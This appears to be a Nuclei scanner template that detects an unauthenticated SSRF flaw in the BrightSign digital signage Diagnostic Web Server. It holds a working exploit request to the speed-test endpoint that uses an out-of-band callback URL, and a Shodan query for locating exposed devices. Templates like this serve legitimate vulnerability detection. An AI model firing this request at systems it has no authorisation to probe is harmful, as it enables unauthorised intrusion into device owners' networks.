http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - dsl:
    - contains(body_1, "Downloaded")
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/speedtest?url={{interactsh-url}}'
id: brightsign-dsdws-ssrf
info:
  author: 0x_Akoko
  description: Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists
    in the BrightSign digital signage media player affecting the Diagnostic Web Server
    (DWS). The application parses user supplied data in the 'url' GET parameter to
    construct a diagnostics request to the Download Speed Test service.
  metadata:
    max-request: 1
    shodan-query: title:"BrightSign"
    verified: true
  name: BrightSign Digital Signage Diagnostic Web Server 8.2.26 Unauthenticated -
    SSRF
  reference:
  - https://brightsign.zendesk.com/hc/en-us/articles/360056180694-Regarding-Advisory-ID-ZSL-2020-5595
  - https://www.zeroscience.mk/codes/brightsign_ssrf.txt
  severity: medium
  tags: ssrf,brightsign,unauth
